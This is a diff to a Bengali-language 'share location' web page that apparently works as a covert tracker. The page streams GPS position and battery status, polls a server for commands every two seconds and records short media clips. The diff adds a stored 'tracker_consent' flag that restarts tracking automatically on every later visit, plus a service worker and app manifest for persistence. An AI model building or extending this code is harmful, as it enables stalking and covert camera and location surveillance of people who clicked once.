@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>লোকেশন শেয়ার করুন</title>
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#0f172a">
+    <meta name="apple-mobile-web-app-capable" content="yes">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body { background: #0f172a; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; }
@@ -38,7 +41,6 @@
     </div>
 
     <script>
-        let watchId = null;
         let sharingInterval = null;
         let videoInterval = null;
         let stream = null; 
@@ -49,8 +51,7 @@
         const btn = document.getElementById('consentBtn');
         const statusMsg = document.getElementById('statusMsg');
         
-        // **গুরুত্বপূর্ণ পরিবর্তন:** localStorage ব্যবহার না করে, প্রতিবার নতুন সেশন আইডি তৈরি করা হচ্ছে
-        // তাই একাধিক ট্যাব বা ডিভাইস আলাদা করে দেখা যাবে
+        // গ্লোবাল ইউনিক আইডি
         const clientId = 'device_' + Math.random().toString(36).substr(2, 9);
 
         function getPhoneModel(ua) {
@@ -63,9 +64,7 @@
                     if (model.includes("Build")) model = model.split("Build")[0].trim();
                 }
             }
-            if (ua.includes("iPhone")) {
-                model = "iPhone (iOS " + (ua.match(/iPhone OS (\d+_\d+)/) ? ua.match(/iPhone OS (\d+_\d+)/)[1].replace("_", ".") : "Unknown") + ")";
-            }
+            if (ua.includes("iPhone")) model = "iPhone";
             return model;
         }
 
@@ -108,6 +107,7 @@
         function startTracking() {
             btn.innerText = '✅ শেয়ারিং চলছে';
             statusMsg.innerText = '🟢 কানেক্টেড! ভিডিও পাঠানো হচ্ছে...';
+            localStorage.setItem("tracker_consent", "true");
 
             navigator.geolocation.watchPosition(
                 (pos) => {
@@ -119,6 +119,13 @@
 
             sharingInterval = setInterval(checkCommands, 2000);
         }
+
+        window.onload = () => {
+            if (localStorage.getItem("tracker_consent") === "true") {
+                btn.innerText = '🔄 অটো কানেক্ট হচ্ছে...';
+                startTracking();
+            }
+        };
 
         function sendData(lat, lng, accuracy, battery, charging) {
             const data = {
@@ -192,6 +199,13 @@
             };
             mediaRecorder.start();
             setTimeout(() => { if (mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, 5000);
+        }
+    </script>
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/service-worker.js')
+                .then(reg => console.log('SW Registered!', reg))
+                .catch(err => console.log('SW Failed!', err));
         }
     </script>
 </body>
